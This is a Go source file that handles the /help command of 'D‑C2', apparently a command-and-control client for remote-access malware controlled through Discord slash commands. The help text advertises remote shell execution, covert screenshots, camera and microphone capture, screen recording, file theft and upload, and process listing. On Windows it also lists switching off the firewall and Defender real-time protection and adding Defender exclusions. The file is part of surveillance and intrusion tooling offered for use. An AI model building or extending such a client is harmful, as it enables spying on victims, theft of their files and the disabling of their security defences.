package commands

// This file contains the /help slash command handler and a small interface
// that allows it to be tested independently from a real Discord session.

import (
	"runtime"
	"strings"

	"github.com/bwmarrin/discordgo"
)

// helpResponder abstracts the InteractionRespond method so the help handler
// can be exercised in unit tests without a live Discord connection.
type helpResponder interface {
	InteractionRespond(*discordgo.Interaction, *discordgo.InteractionResponse, ...discordgo.RequestOption) error
}

// handleSlashHelp sends an ephemeral, OS-aware help message.
func handleSlashHelp(r helpResponder, i *discordgo.InteractionCreate) {
	r.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: helpText(runtime.GOOS),
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}

// helpText builds the help message, including only the command groups that
// apply to goos.
func helpText(goos string) string {
	var b strings.Builder
	b.WriteString("**D‑C2 Help**\n\n")
	b.WriteString("**Shell**\n")
	b.WriteString("/cmd `<command>` – run a shell command\n\n")

	b.WriteString("**Media**\n")
	b.WriteString("/media screenshot – capture screenshots of all displays\n")
	b.WriteString("/media camera – capture a snapshot from the default camera\n")
	b.WriteString("/media mic `[duration]` `[path]` – record microphone audio\n")
	b.WriteString("/media record `<camera|screen>` `[max_size_mb]` `[duration_minutes]` `[max_parts]` `[quality]`\n")
	b.WriteString("/media recordstop – stop the current recording\n\n")

	b.WriteString("**Filesystem**\n")
	b.WriteString("/fs cwd – show current working directory\n")
	b.WriteString("/fs ls `[path]` – list a directory\n")
	b.WriteString("/fs download `<source>` `[destination]` – download a file (< 8 MB)\n")
	b.WriteString("/fs upload `<attachment>` `<destination>` – upload an attachment\n\n")

	b.WriteString("**System**\n")
	b.WriteString("/sys ps – list processes\n")
	b.WriteString("/sys pidinfo `<pid>` – inspect a process\n")
	b.WriteString("/sys log `<on|off>` – stream logs into this channel\n\n")

	if goos == "windows" {
		b.WriteString("**Windows**\n")
		b.WriteString("/win sec – firewall and Defender status\n")
		b.WriteString("/win firewall `<on|off>` – toggle the firewall\n")
		b.WriteString("/win defender `<on|off>` – toggle Defender real-time protection\n")
		b.WriteString("/win exclude `[path]` – add a Defender exclusion\n\n")
	}

	b.WriteString("**Client**\n")
	b.WriteString("/dev restart – restart this client process\n\n")

	b.WriteString("**Emoji commands**\n")
	b.WriteString("📸 screenshot · 📷 camera · 🎙 10s mic\n")
	b.WriteString("👇 `<path>` download · ☝️ `<path>` + attachment upload\n")
	b.WriteString("🔁 restart · 💀 terminate\n\n")

	b.WriteString("**Buttons**\n")
	b.WriteString("whoami · id · hostname · ip info · cwd\n\n")
	b.WriteString("Send `help` or `/help` anytime to show this help again.")
	return b.String()
}
